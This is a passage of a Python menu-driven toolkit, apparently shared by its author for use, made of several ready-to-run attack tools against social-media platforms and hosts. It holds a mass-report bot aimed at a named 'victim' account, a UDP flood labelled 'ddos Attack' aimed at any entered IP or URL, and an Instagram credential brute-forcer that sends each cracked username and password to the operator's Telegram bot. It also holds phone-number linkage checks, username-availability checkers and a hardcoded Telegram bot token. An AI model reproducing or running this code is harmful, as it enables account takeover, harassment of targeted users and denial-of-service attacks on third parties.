				u = input("check point -- Input>>\n0 - Phone Number\n1 - Email\nInput:")
				mi = {"choice": u}
				logheader["x-csrftoken"] = loginreq.cookies["csrftoken"]
				mi1 = s.post(url=f'https://www.instagram.com{urlb}', data=mi, headers=logheader)
				f1 = input("--Done Send Code-- Input Code : ")
				date = {"security_code": f'{f1}'}
				logheader["x-csrftoken"] = loginreq.cookies["csrftoken"]
				mi2 = s.post(url=f'https://www.instagram.com{urlb}', data=date, headers=logheader)
				logheader["x-csrftoken"] = mi2.cookies["csrftoken"]
				if ('"errors": ["Please check the code we sent you and try again."]') in mi2.text:
					print("--Error Code--")
			else:
				logurll = 'https://www.instagram.com/accounts/login/ajax/'
				dataa = {
               'username': username,
               'enc_password': '#PWD_INSTAGRAM_BROWSER:0:&:' + password}
				
				loginreqq = s.post(logurll, data=dataa, headers=logheader)
				if ('"authenticated": true') in loginreqq.text:
					print("True Login" + ' »»', username)
					for i in range(11):
						idd = ['407474340', '2872859990', '7993793340', '1606183110', '534649695', '2540710248',
                          '1925510241',
                          '1399564099', '2273694343', '1119431451', '1782327804']
						
						for ids in idd:
							logheader["x-csrftoken"] = loginreqq.cookies["csrftoken"]
							flwurl = 'https://www.instagram.com/web/friendships/' + str(ids) + '/follow/'
							reqflw = s.post(flwurl, headers=logheader)
							sleep(120)
							for ids in idd:
								logheader["x-csrftoken"] = loginreqq.cookies["csrftoken"]
								flwurl1 = 'https://www.instagram.com/web/friendships/' + str(ids) + '/unfollow/'
								reqflw1 = s.post(flwurl1, headers=logheader)					
								print(f"Done ({str(i)}/11)")
		log()
#مالك شغل			
	elif ooi == '10':
		import os
		import time
		import uuid
		import secrets
		import requests
		import user_agent
		from time import sleep
		from user_agent import generate_user_agent
		os.system('pip install os')
		os.system('pip install time')
		os.system('pip install requests')
		os.system('pip install uuid')
		os.system('pip install secrets')
		os.system('pip install user_agent')
		
		uid = uuid.uuid4()
		r = requests.Session()
		cookie = secrets.token_hex(8)*2
		JT ="""

 ____  ____   _    __  __ ____   ___ _____ 
/ ___||  _ \ / \  |  \/  | __ ) / _ \_   _|
\___ \| |_) / _ \ | |\/| |  _ \| | | || |  
 ___) |  __/ ___ \| |  | | |_) | |_| || |  
|____/|_| /_/   \_\_|  |_|____/ \___/ |_|

"""
		#jailtweaks
		
		print(JT)
		time.sleep(2)
		print(""" 
•••••••••••••••••••••••                                                              
Rights : sol4o
@berliv and @vv1ck
•••••••••••••••••••••••
""")
		time.sleep(1)
		print("<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<")
		time.sleep(1)
		print("BOT SPAM INSTAGRAM 🎩")
		print("<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<")
		time.sleep(2)
		print("[!] Please login with a dummy account ..")
		print(" ")
		time.sleep(2)
		username = input('[+] Enter you user : ')
		time.sleep(1)
		password = input('[+] Enter you pass : ')
		time.sleep(2)
		target = input('[+] Enter the user victim : ')
		time.sleep(1)
		slp = int(input('[+] Enter the speed : '))
		#def login():
		
		user = username
		pes = password
		url = 'https://www.instagram.com/accounts/login/ajax/'
		headers = {
        "user-agent": generate_user_agent(),
        'x-csrftoken': 'missing',
        'mid': cookie
        }
		
		data = {'username':f'{user}',
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{pes}',
            'queryParams': '{}',
            'optIntoOneTap': 'false'}
		
		req_login = r.post(url,headers=headers,data=data)
		if ("userId") in req_login.text:
			r.headers.update({'X-CSRFToken': req_login.cookies['csrftoken']})
			print("<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<")
			print('You have signed in successfully')
			print("<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<")
			url_id = 'https://www.instagram.com/{}/?__a=1'.format(target)
			req_id = r.get(url_id).json()
			user_id = str(req_id['logging_page_id'])
			idd = user_id.split('_')[1]
			done = 0
			while True:
				url_report = 'https://www.instagram.com/users/{}/report/'.format(idd)
				datas = {'source_name':'','reason_id':1,'frx_context':''}
				report = r.post(url_report,data=datas)
				print('[{}] Done Reporting '.format(done))
				sleep(slp)
				done += 1
		else:
			print("<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<")
			print('[!] Error ! ')
			exit()
			
#مالك شغل		
	elif ooi == '11':
		import time
		import socket
		import os
		os.system('pip install os')
		os.system('pip install time')
		os.system('pip install socket')
		os.system("pkg install toilet -y ")
		os.system("pkg install figlet -y ")
		os.system("clear")
		os.system("toilet -f mono12 -F gay DDOS")
		print("==========================================")
		print(Fore.RED +"""    ddos Attack 🚀
Caution, I am not responsible for any wrong use of the tool
""")
		print("==========================================")
		target = input("Enter Target url or Ip : ")
		target.replace("http://", "")
		target.replace("https://","")
		target.replace("www.","")
		ip = socket.gethostbyname(target)
		port = 80
		vv1ck = "DDOSjsjsjjdjdjdjdjjjjjjjjjiiiiiiiopppkkkkjjjjjhhhbbbbgbvvvvvvvvvvvvhhyggggh"
		os.system("clear")
		os.system("toilet -f mono12 LOADING | lolcat")
		print(Fore.RED +"Loading{>>> }5%")
		time.sleep(2)
		print("Loading{>>>>> }10%")
		time.sleep(2)
		print(Fore.BLUE +"Loading{>>>>>>> }40%")
		time.sleep(2)
		print(Fore.RED +"Loading{>>>>>>>>>> }90%")
		time.sleep(2)
		print(Fore.RED +"Loading{>>>>>>>>>>>>>>}100%")
		os.system("clear")
		os.system("figlet Attack_Starting")
		while True:
			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			sock.sendto(bytes(vv1ck,"UTF-8"), (ip,port))
			time.sleep(1)
			print(port, "<===send packet to ===>",ip)
		
	elif ooi == '12':
		import requests
		import os
		import time 
		import random
		import string 
		from user_agent import generate_user_agent
		os.system('pip install os')
		os.system('pip install time')
		os.system('pip install random')
		os.system('pip install string')
		os.system('pip install requests')
		print("""
       @vv1ck
██╗███╗   ██╗███████╗████████╗ █████╗        
██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗       
██║██╔██╗ ██║███████╗   ██║   ███████║       
██║██║╚██╗██║╚════██║   ██║   ██╔══██║       
██║██║ ╚████║███████║   ██║   ██║  ██║██╗    
╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝ 

Brute Force instagram automatic $
First, open a new folder named pass.txt
Then put the passwords inside it
And run the tool will automatically guess the accounts ...

""")
		time.sleep(1)
		id = input("[+] Enter you id : ")
		token = input("[+] Enter TOKEN bot : ")
		session = requests.Session()
		users = string.digits + string.ascii_lowercase
		passwords = open('pass.txt', 'r').read().splitlines()
		
		def joker():
			url = "https://www.instagram.com/accounts/login/ajax/"
			while True:
				user = str("".join(random.choice(users)for i in range(4)))
				password = str(random.choice(passwords))
				headers = {
      "user-agent": generate_user_agent(), 
      'x-csrftoken': 'missing', 
      'x-instagram-ajax': '2102073a1373',
  }
				data = {
        "username": user,
        "enc_password": "#PWD_INSTAGRAM_BROWSER:0:1589682409:{}".format(password),
        "queryParams": "{}",
        "optIntoOneIap": "false",
  }
				
				req = session.post(url,headers=headers,data=data)
				response = req.text 
				if ('"authenticated": true,') in response:
					print("Hacked {}:{}".format(user,password))
					requests.get('https://api.telegram.org/bot'+token+'/sendMessage?chat_id=' + id + '&text=Hi i Fucked New Account ✅\n━━━━━━━━━━━━\n✪. Username : {}\n✪. Password : {}\n━━━━━━━━━━━━\n<\> ; @vv1ck'.format(user,password))
					input("[?] Continue .. ")
				
				elif '"checkpoint_url"' in response:
					print("secure {}:{} ".format(user,password))
				
				else:
					print("Not Vaild {}:{}".format(user,password))
		time.sleep(3)
		joker()
#مالك شغل
	elif ooi == '13':
		import os
		import requests
		import json
		import time
		os.system('pip install os')
		os.system('pip install time')
		os.system('pip install json')
		os.system('pip install requests')
		time.sleep(1)
		jok = """
███████ ███    ██  █████  ██████          
██      ████   ██ ██   ██ ██   ██         
███████ ██ ██  ██ ███████ ██████          
     ██ ██  ██ ██ ██   ██ ██              
███████ ██   ████ ██   ██ ██ ██           
                                          
<---------------------------------------->
        |   Alert tool is free   |
        |                        |
        |     JOKER and FAHRD    |
<---------------------------------------->
The function of the tool informs you if the number is related to snapchat or not
"""
		print(jok)
		time.sleep(3)
		
		CountryCode = str(input("Key of Country ( example : SA ) : "))
		phonenumber = int(input("Enter The PhoneNumber : "))
		
		def check():
			url = "https://accounts.snapchat.com/accounts/validate_phone_number"
			cookies = {
			"xsrf_token":'BtpZ6sL9OenEJJYbQXFEsg'
	}
			headers = {
	"accept": "*/*",
	"accept-encoding": "gzip, deflate, br",
	"accept-language": "ar,en;q=0.9,en-US;q=0.8",
	"content-type": "application/x-www-form-urlencoded; charset=utf-8",
	"sec-fetch-dest": "empty",
	"sec-fetch-mode": "same-origin",
	"sec-fetch-site": "same-origin",
	"user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Mobile Safari/537.36"
	}
			
			data = {"phone_country_code":CountryCode,"phone_number":phonenumber,"xsrf_token":"BtpZ6sL9OenEJJYbQXFEsg"}
			
			req = requests.post(url,data=data,headers=headers,cookies=cookies).json()
			text = str(req)
			print(text)
			if text.find('OK')>=0:
				print("Unlinked !")
			else:
				print("linked !")
		check()
		print('')
		input("press enter to close the program.")
#مالك شغل:
	elif ooi == '14':
		import os
		import uuid
		import time
		import secrets
		import requests
		import sys as n
		import time as mm
		from time import sleep
		uid = uuid.uuid4()
		r = requests.Session()
		cookie = secrets.token_hex(8)*2
		os.system('pip install os')
		os.system('pip install sys')
		os.system('pip install uuid')
		os.system('pip install secrets')
		os.system('pip install requests')
		def slow(M):
			for c in M + '\n':
				n.stdout.write(c)
				n.stdout.flush()
				mm.sleep(1. / 120)
		slow("""
███████╗███████╗██╗     ███████╗    
██╔════╝██╔════╝██║     ██╔════╝    
███████╗█████╗  ██║     █████╗      
╚════██║██╔══╝  ██║     ██╔══╝      
███████║███████╗███████╗██║         
╚══════╝╚══════╝╚══════╝╚═╝         
                    ╦ ╔═╗ ╦╔═ ╔═╗ ╦═╗
                    ║ ║ ║ ╠╩╗ ║╣  ╠╦╝
                   ╚╝ ╚═╝ ╩ ╩ ╚═╝ ╩╚═
           Self Reporting Bot
""")	
		print('Please login with a dummy account')	
		print('___________________________________')
		print(" ")
		time.sleep(1)
		username = input('>> you user : ')
		time.sleep(1)
		password = input('>> you pass : ')
		print(" ")
		print('           please wait')
		time.sleep(1)
		def login():
			url = 'https://www.instagram.com/accounts/login/ajax/'
			headers = {"user-agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36', 'x-csrftoken': 'missing', 'mid': cookie}
			data = {
				'username': username,
				'enc_password': '#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
				'queryParams': '{}',
				'optIntoOneTap': 'false',}
			req_login = r.post(url,headers=headers,data=data)
			
			if ("userId") in req_login.text:
				r.headers.update({'X-CSRFToken': req_login.cookies['csrftoken']})
				time.sleep(1)
				print(" ")
				print('>> Signed in \n')
				print(" ")
				time.sleep(1)
				target = input('>> The victim : ')
				time.sleep(1)
				slep = int(input('       >> Sleep ? :'))
				ul_id = 'https://www.instagram.com/{}/?__a=1'.format(target)
				req_id = r.get(ul_id).json()
				user_id = str(req_id['logging_page_id'])
				id = user_id.split('_')[1]
				done = 1
				
				while True:
					url_report = 'https://www.instagram.com/users/{}/report/'.format(id)
					datas = {'source_name':'','reason_id':2,'frx_context':''} 
					report = r.post(url_report,data=datas)
					print('[•] Done Self {}<'.format(done))
					sleep(slep)
					done += 1
			else:
				print("           _________________")
				print('          |  Error Login .. |')
				print('          |_________________|')
				exit()
		login()
#مالك دخل
	elif ooi == '15':
		import os
		import time
		import requests
		import sys as n
		import time as mm
		os.system('pip install os')
		os.system('pip install sys')
		os.system('pip install time')
		os.system('pip install requests')
		def slow(M):
			for c in M + '\n':
				n.stdout.write(c)
				n.stdout.flush()
				mm.sleep(1. / 120)
		slow("""
        ╔╦╗ ╦ ╦╔═ ╔╦╗ ╔═╗ ╦╔═  
         ║  ║ ╠╩╗  ║  ║ ║ ╠╩╗  
         ╩  ╩ ╩ ╩  ╩  ╚═╝ ╩ ╩ 
                | Checker |
                 ---------""")
		print("""
The VPN must be running before starting
Create a new folder named username.txt
Put the username you want to check
Accounts will be sent to Telegram
Enter this bot @ios11_bot and click start
""")
		print('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
		time.sleep(2)
		joker = input(">> Entet you ID : ")
		jok = 'username.txt'
		headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
            "Connection": "close",
            "Host": "www.tiktok.com",
            "Accept-Encoding": "gzip, deflate",
            "Cache-Control": "max-age=0"
}
		
		tok = ('1401074229:AAFObCSdKqIeCbYj95bufmNL-YfJCyFRa8M')
		ok = """
〰️〰️〰️〰️〰️〰️〰️〰️
[•] USER TIKTOK 🥳👇🏻
〰️〰️〰️〰️〰️〰️〰️〰️"""
		mon = """〰️〰️〰️〰️〰️〰️〰️〰️
[•] @vv1ck ( JOKER )
"""
		file = open(jok, "r")
		while True:
			Check = file.readline().split('\n')[0]
			tiklog = f'https://www.tiktok.com/@{Check}'
			rq = requests.get(tiklog, headers=headers)
			if rq.status_code == 404:
				print(">> Available >> " + Check)
				tlg =(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={joker}&text={ok}\n[√] user > : {Check}\n{mon}')
				
				r = requests.post(tlg)
			elif rq.status_code == 200:
				print(">> Not available > " + Check)
				if (Check == ""):
					break
#مالك شغل
	
	elif ooi == '16':
		import requests
		import os
		import time
		os.system('pip install os')
		os.system('pip install time')
		os.system('pip install requests')
		os.system("clear")
		joker = """
  ──▄█████████████████████████▄──
  ▄█▀░█░█░█░░░░░░░░░░░░░░░░░░░▀█▄
  █░░░█░█░█░░░░░░░░░░░░░░█████░░█
  █░░░█░█░█░░░░░░░░░░░░░░█████░░█
  █░░░█░█░█░░░░░░░░░░░░░░█████░░█
  █░░░░░░░░░▄▄▄█████▄▄▄░░░░░░░░░█
  ███████████▀▀░░░░░▀▀███████████
  █░░░░░░░██░░▄█████▄░░██░░░░░░░█
  █░░░░░░░██░██▀░░░▀██░██░░░░░░░█
  █░░░░░░░██░██░░░░░██░██░░░░░░░█
  █░░░░░░░██░██▄░░░▄██░██░░░░░░░█
  █░░░░░░░██▄░▀█████▀░▄██░░░░░░░█
  █░░░░░░░░▀██▄▄░░░▄▄██▀░░░░░░░░█
  █░░░░░░░░░░▀▀█████▀▀░░░░░░░░░░█
  █░░░░ insta check ░░░░░░░░░░░░█
  █░░░░  tele : @J_N_Q  ░░░░░░░░█
  █░░░░  Insta :@vv1ck ░░░░░░░░░█
  ▀█▄░░░░░░░░░░░░░░░░░░░░░░░░░▄█▀
  ──▀█████████████████████████▀──
 
    """
		time.sleep(2)
		print(joker)
		joke = """
<---------------------------------------->
        | (𝑇) Alert tool is free  |
        |   The tool needs a VPN  |
        |     JOKER and 𝙿𝙰𝙽𝙰𝙳𝙾𝙻    |
You have to create a file in the name of the user.txt and put the accounts inside it
<---------------------------------------->
"""
		print(joke)
		gg = input("[!] Type the name of the file that contains the accounts -> : ")
		os.system("clear")
		head = ({
  'UserAgent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
  'x-instagram-ajax':'1',
  'X-Requested-With': 'XMLHttpRequest',
  'origin': 'https://www.instagram.com',
  'ContentType' : 'application/x-www-form-urlencoded',
  'Connection': 'keep-alive',
  'Accept': '*/*',
  'Referer': 'https://www.instagram.com',
  'authority': 'www.instagram.com',
  'Host' : 'www.instagram.com',
  'Accept-Language' : 'en-US;q=0.6,en;q=0.4',
  'Accept-Encoding' : 'gzip, deflate'
  
})
		file = open(gg , "r")
		print(joke)
		while True:
			Check = file.readline().split('\n')[0]
			url = ("https://instagram.com/"+Check)
			rq = requests.get(url, headers=head)
			if rq.status_code == 404:
				print("|==============================|")
				print ("\033[1;32;40m|[√] هاذة اليوزر متاح ✅:-> " +Check)
			elif rq.status_code == 200:
				print("|==============================|")
				print ("\033[1;31;40m|[!] هاذة اليوزر غير متاح ❌:-> "+Check)
			if(Check == ""):
				break
		
	
	elif ooi == '17':
		import requests
		import time as mm
		import sys as n
		import os
		os.system('pip install os')
		os.system('pip install time')
		os.system('pip install sys')
		os.system('pip install requests')
		
		mo = """

<---------------------------------------->
        | (𝑇) Alert tool is free  |
        |   The tool needs a VPN  |
        |     JOKER and 𝙿𝙰𝙽𝙰𝙳𝙾𝙻    |
You have to create a file in the name of the UserFound.txt and put the accounts inside it
<---------------------------------------->
"""
		
		print(mo)
		username = input("[!] Type the name of the file that contains the accounts -> : ")
		use = username
		def getUser(use):
			url = "https://app.snapchat.com:443/loq/suggest_username_v2"
			headers = {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
                "Accept": "application/json", "Accept-Locale": "en_SA", "Connection": "close",
                "X-Snapchat-UUID": "",
                "x-snapchat-att": "CgsYACAAFaiThEQIChK4AXyUc_6dfBtKSeUR7bYZn0xI3IaxCqocThfdZ4fCFeoM8mrMEximQTGWrkzcyg1sjaRpG4u1K0n7-Next7xsXOUxyVojGVG1gu6BZ8_cFt0q-JMVpYEUrN6IIab-cKS9_5WiHel0tW6U04TmiXOac9dHtkIgbvF0w9J6vq3XxA8_IEF6ibfu2qkBZxvaRuCrEzZh-4GFEo_0BM6m2dJmTZTxTw5xxKwlGBIXq_yqQ7Ba-v8lfOEEzdw=",
                "User-Agent": "Snapchat/10.87.0.69 (Twitter XcodeOn1; iOS 13.5.1; gzip)",
                "Accept-Language": "en-SA;q=1, ar-SA;q=0.9, en-US;q=0.8, bn-SA;q=0.7, pa-SA;q=0.6",
                "Accept-Encoding": "gzip, deflate"}
			
			web_data = {"req_token": "9307955c05e1ab886e3a9eeff7a501f40deb4d8219ac0a87f9b4f214dfc518eb",
                "requested_username": use, "timestamp": "1595566579397"}
			
			response = requests.post(url, headers=headers, data=web_data)
			if (response.status_code == 200):
				data = response.json()
				if (data["status_code"] == "OK"):
					print("This account is not used -> : {use}" )
					with open('UserFound.txt', 'a') as x:
						x.write(use + '\n')
				else:
					print(f"This account is used -> : {use}")
		file = open(use, "r")
		lines = file.readlines()
		for line in lines:
			line = str(line).strip()
			getUser(line)	
	
	
	elif ooi == '18':
		import requests
		import os
		from colored import fg
		os.system('pip install os')
		os.system('pip install requests')
		color1 = fg(50)
		color2 = fg(1)
		print("""
You have to create a file in the name of the user.txt and put the accounts inside it
<---------------------------------------->
""")
		username = input("[!] Type the name of the file that contains the accounts -> : ")
		use = username
		os.system("clear")
		headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cookie': '__cfduid=d0ffc45fa1efa9e0d736b1c14bb6c594a1605979176; _ga=GA1.2.821290333.1605979177; G_ENABLED_IDPS=google; __gads=ID=c7705da3c1f492a3:T=1606880061:S=ALNI_MZomN5KxOkG_i59jEZaJOEsiBQi6g; _gid=GA1.2.725225671.1606979880; cf_clearance=dcd41d1895597ca22ffa90136382f60ddea9e6e2-1606979881-0-150; __rtgt_sid=ki8ibzq4bp1k2d; _gat=1',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'
}
		file = open(username, "r")
		os.system("clear")
		RIG = """

<---------------------------------------->
        | (𝑇) Alert tool is free  |
        |                         |
        |     JOKER and 𝙿𝙰𝙽𝙰𝙳𝙾𝙻    |
<---------------------------------------->
"""
		print(RIG)
		
		while True:
			Check = file.readline().split('\n')[0]
			tiillog = f'https://tellonym.me/{Check}'
			rq = requests.get(tiillog, headers=headers)
			if rq.status_code == 404:
				print("|==============================|")
				print(color1+"[√] This account is not used -> : " + Check)
			elif rq.status_code == 200:
				print("|==============================|")
				print(color2+"[!]This account is used -> : " + Check)
				if (Check == ""):
					break
		
			
			

	
if __name__ == '__main__':
	main()
	print("%%%%%%%%%%%%%%%%%%%%%%%%%%%")
	print("add me insta : vv1ck")
	print('https://instagram.com/vv1ck')
# تنبية بعض الادوات ليست من برجمتي 👍🏻
# Caution, some tools are not from my programming ...

# {insta : vv1ck }
